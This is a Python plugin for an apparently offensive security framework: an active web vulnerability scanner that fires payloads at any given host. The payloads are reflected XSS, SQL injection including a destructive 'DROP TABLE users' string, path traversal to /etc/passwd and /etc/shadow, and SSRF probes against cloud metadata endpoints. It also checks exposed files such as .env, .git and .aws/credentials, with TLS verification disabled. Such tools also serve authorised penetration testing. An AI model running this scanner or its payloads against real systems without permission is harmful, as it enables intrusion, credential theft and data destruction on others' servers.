from core.plugin_manager import BasePlugin
import asyncio
import re
import socket
import ssl
import urllib.request
import urllib.error
import urllib.parse


_XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>",
    '<svg onload=alert(1)>',
]

_SQLI_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "1; DROP TABLE users--",
    "1 UNION SELECT null,null--",
]

_LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../windows/win.ini",
    "..%2f..%2f..%2fetc%2fpasswd",
    "/etc/passwd%00",
]

_PATH_TRAVERSAL_PATHS = [
    "/.git/HEAD",
    "/.env",
    "/admin",
    "/admin/",
    "/phpmyadmin",
    "/wp-admin",
    "/api/v1/users",
    "/actuator/env",
    "/actuator/heapdump",
    "/.aws/credentials",
    "/server-status",
    "/wp-config.php",
    "/config.php",
    "/.htpasswd",
]

_SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",    # AWS IMDS
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://localhost/admin",
    "http://127.0.0.1:22/",
    "http://[::1]/",
]

_ERROR_SIGNATURES = {
    "sqli": [
        r"SQL syntax", r"mysql_fetch", r"ORA-\d{5}", r"PostgreSQL.*ERROR",
        r"Warning.*mysql", r"Unclosed quotation mark", r"SQLSTATE",
    ],
    "lfi": [
        r"root:x:0:0", r"\[extensions\]",  # /etc/passwd, win.ini
        r"daemon:x:", r"bin:x:",
    ],
    "xss_reflected": [],  # checked separately by looking for payload in response
    "error_disclosure": [
        r"Exception in thread", r"Traceback \(most recent call last\)",
        r"at [\w.]+\([\w.]+:\d+\)", r"Parse error:", r"Fatal error:",
    ],
}


class WebScannerPlugin(BasePlugin):
    def __init__(self):
        self.findings: list[dict] = []
        self._traffic_log: list[dict] = []  # filled by pipeline from proxy events

    @property
    def name(self) -> str:
        return "Web-Scanner"

    @property
    def description(self) -> str:
        return "Active Web Application Vulnerability Scanner"

    async def start(self):
        print("Web-Scanner: initialized.")

    async def stop(self):
        pass

    # ------------------------------------------------------------------
    # Passive analysis (fed from proxy traffic)
    # ------------------------------------------------------------------

    def analyze_traffic(self, host: str, request_bytes: bytes, response_bytes: bytes):
        """Called by pipeline engine whenever proxy captures a request/response pair."""
        try:
            req_text  = request_bytes.decode("utf-8", errors="ignore")
            resp_text = response_bytes.decode("utf-8", errors="ignore")
        except Exception:
            return

        # Check response for error disclosure
        for sig in _ERROR_SIGNATURES["error_disclosure"]:
            if re.search(sig, resp_text):
                self._record(host, "ERROR_DISCLOSURE", 0,
                             f"Server error detail leaked: {sig}")

        # Check for reflected input (primitive XSS signal)
        params = self._extract_params(req_text)
        for val in params.values():
            if val and len(val) > 3 and val in resp_text:
                self._record(host, "REFLECTED_INPUT", 0,
                             f"Input '{val[:40]}' reflected in response — potential XSS vector")

    # ------------------------------------------------------------------
    # Active scanning
    # ------------------------------------------------------------------

    async def scan(self, host: str, port: int = 80, https: bool = False) -> list[dict]:
        """Full active scan: path traversal, XSS, SQLi, LFI, SSRF."""
        base_url = f"{'https' if https else 'http'}://{host}:{port}"
        print(f"Web-Scanner: active scan → {base_url}")
        tasks = [
            self._check_paths(base_url, host),
            self._fuzz_params(base_url, host),
        ]
        await asyncio.gather(*tasks)
        self.emit("WEB_SCAN_COMPLETE", {"host": host, "findings": len(self.findings)})
        return self.findings

    async def _check_paths(self, base_url: str, host: str):
        for path in _PATH_TRAVERSAL_PATHS:
            url = base_url + path
            status, body = await asyncio.to_thread(self._http_get, url)
            if status == 0:
                continue
            if status == 200:
                # Check for interesting content
                for vuln_type, sigs in _ERROR_SIGNATURES.items():
                    for sig in sigs:
                        if re.search(sig, body, re.IGNORECASE):
                            self._record(host, f"SENSITIVE_PATH:{vuln_type.upper()}", status,
                                         f"{path} → {sig}")
                # Bare 200 on sensitive paths
                if any(p in path for p in (".git", ".env", "config", "htpasswd", "actuator")):
                    self._record(host, "SENSITIVE_FILE_EXPOSED", status,
                                 f"{path} returned HTTP 200")
            await asyncio.sleep(0.05)

    async def _fuzz_params(self, base_url: str, host: str):
        # Discover injectable parameters from the index page
        _, body = await asyncio.to_thread(self._http_get, base_url + "/")
        param_names = list(set(re.findall(r'name=["\'](\w+)["\']', body)))[:10]
        if not param_names:
            param_names = ["q", "id", "search", "query", "url", "file", "path"]

        for pname in param_names:
            # SQLi
            for pl in _SQLI_PAYLOADS:
                url = f"{base_url}/?{pname}={urllib.parse.quote(pl)}"
                status, resp = await asyncio.to_thread(self._http_get, url)
                for sig in _ERROR_SIGNATURES["sqli"]:
                    if re.search(sig, resp, re.IGNORECASE):
                        self._record(host, "SQL_INJECTION", status,
                                     f"param={pname} payload={pl[:30]!r} matched {sig}")
                await asyncio.sleep(0.05)

            # XSS
            for pl in _XSS_PAYLOADS:
                url = f"{base_url}/?{pname}={urllib.parse.quote(pl)}"
                status, resp = await asyncio.to_thread(self._http_get, url)
                if pl in resp:
                    self._record(host, "XSS_REFLECTED", status,
                                 f"param={pname} payload reflected verbatim")
                await asyncio.sleep(0.05)

            # LFI
            for pl in _LFI_PAYLOADS:
                url = f"{base_url}/?{pname}={urllib.parse.quote(pl)}"
                status, resp = await asyncio.to_thread(self._http_get, url)
                for sig in _ERROR_SIGNATURES["lfi"]:
                    if re.search(sig, resp):
                        self._record(host, "LFI", status,
                                     f"param={pname} payload={pl!r} matched {sig}")
                await asyncio.sleep(0.05)

        # SSRF (url/file params only)
        for pname in [p for p in param_names if p in ("url", "file", "path", "src", "href")]:
            for pl in _SSRF_PAYLOADS:
                url = f"{base_url}/?{pname}={urllib.parse.quote(pl)}"
                status, resp = await asyncio.to_thread(self._http_get, url)
                if status == 200 and any(k in resp for k in ("ami-id", "computeMetadata", "root:")):
                    self._record(host, "SSRF", status,
                                 f"param={pname} fetched internal resource: {pl[:60]}")
                await asyncio.sleep(0.05)

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _record(self, host: str, vuln_type: str, status: int, detail: str):
        finding = {"host": host, "type": vuln_type, "status": status, "detail": detail}
        if finding not in self.findings:
            self.findings.append(finding)
            self.emit("WEB_VULN_FOUND", finding)
            if self.target_store:
                self.target_store.cm.save_finding(
                    self.target_store.active_campaign,
                    f"WEB:{vuln_type}",
                    host,
                    detail[:200],
                )

    @staticmethod
    def _http_get(url: str, timeout: int = 5) -> tuple[int, str]:
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            req = urllib.request.Request(
                url,
                headers={"User-Agent": "Mozilla/5.0",
                         "Accept": "text/html,*/*"},
            )
            resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
            body = resp.read(32768).decode("utf-8", errors="ignore")
            return resp.status, body
        except urllib.error.HTTPError as e:
            try:
                body = e.read(4096).decode("utf-8", errors="ignore")
            except Exception:
                body = ""
            return e.code, body
        except Exception:
            return 0, ""

    @staticmethod
    def _extract_params(request_text: str) -> dict:
        params = {}
        # From query string
        m = re.search(r"\?([\w=&%+.]+)", request_text)
        if m:
            for pair in m.group(1).split("&"):
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    params[k] = urllib.parse.unquote_plus(v)
        # From POST body
        for line in request_text.split("\r\n"):
            if "=" in line and "&" in line and not line.startswith("GET"):
                for pair in line.split("&"):
                    if "=" in pair:
                        k, v = pair.split("=", 1)
                        params[k] = urllib.parse.unquote_plus(v)
        return params
